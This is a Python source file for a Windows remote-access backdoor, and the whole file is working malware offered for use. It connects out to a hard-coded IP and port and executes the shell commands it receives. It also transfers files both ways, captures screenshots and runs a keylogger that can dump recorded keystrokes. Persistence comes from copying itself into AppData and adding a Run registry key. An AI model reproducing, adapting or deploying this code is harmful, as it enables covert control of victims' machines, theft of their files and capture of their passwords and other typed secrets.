import socket
import json
import subprocess
import os
import pyautogui
import threading
import keylogger
import shutil
import sys
import time

def send_data(data):
	jsondata = json.dumps(data)
	s.send(jsondata.encode())


def recv_data():
	data = ''
	while True: # Infinite loop so that we can recv more than 1024 bytes in a go.
		try:
			data = data + s.recv(1024).decode().rstrip()
			return json.loads(data) # deserializing the serialized data
		except ValueError:
			continue

def download_file(file_name): 
	f = open(file_name, 'wb') # create a new file in write mode.
	s.settimeout(1)
	chunk = s.recv(1024) # We receive the file as chunks of 1024 bytes
	while True: # Define an infinite loop
		f.write(chunk) # write the recieved chunks to the file.
		try:
			chunk = s.recv(1024) # we'll continue to receive the file until there is nothing more to recieve. Here the program hangs.
		except socket.timeout as e: # Here we exit out of the infinite loop as wet set timeout to 1 earlier.
			break
	s.settimeout(None)
	f.close()

def upload_file(file_name):
	f = open(file_name, "rb")
	s.send(f.read())

def screenshot():
	scrnsht = pyautogui.screenshot()
	scrnsht.save("screenshot.png")

def persist(reg_name, copy_name):
	# creating a copy of the backdoor in appdata folder.
	file_location = os.environ['appdata'] + '\\' + copy_name
	try:
		if not os.path.exists(file_location):
			shutil.copyfile(sys.executable, file_location) # The first arg specifies what we are copying, in this case we are copying our own executable which is specified by (sys.executable). second param is where we are copying it to: here to the specified file path.
			# Adding the registry key to the specified file location.
			subprocess.call('reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v ' + reg_name + ' /t REG_SZ /d "' + file_location + '"', shell=True)
			send_data(f"Created persistence with reg key: {reg_name}")
		else:
			send_data("[+] Persistence already exists!")
	except:
		send_data("[-] Error creating persistence with the target")

def connection():
	while True:
		time.sleep(20)
		try:
			s.connect(("192.168.1.105", 5555))
			shell()
			s.close()
			break
		except:
			connection()

def shell():
	while True:
		command = recv_data()
		if command == "quit":
			break
		elif command == "help":
			pass
		elif command == "clear":
			pass
		elif command[:3] == "cd ":
			try:
				os.chdir(command[3:])
			except FileNotFoundError:
				pass
		elif command[:6] == "upload":
			download_file(command[7:])
		elif command[:8] == "download":
			upload_file(command[9:])
		elif command[:10] == "screenshot":
			screenshot()
			upload_file('screenshot.png')
			os.remove('screenshot.png')
		elif command[:12] == "keylog_start":
			keylog = keylogger.Keylogger()
			t = threading.Thread(target=keylog.start)
			t.start()
			send_data("[+] Keylogger Started!")
		elif command[:11] == "keylog_dump":
			logs = keylog.read_logs()
			send_data(logs)
		elif command[:11] == "keylog_stop":
			keylog.self_destruct()
			t.join()
			send_data("[+] Keylogger Stopped!")
		elif command[:11] == "persistence":
			reg_name, copy_name = command[12:].split(' ')
			persist(reg_name, copy_name)

		else:
			execute = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
			result = execute.stdout.read() + execute.stderr.read()
			result = result.decode()
			send_data(result)

if __name__ == "__main__":
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	connection()
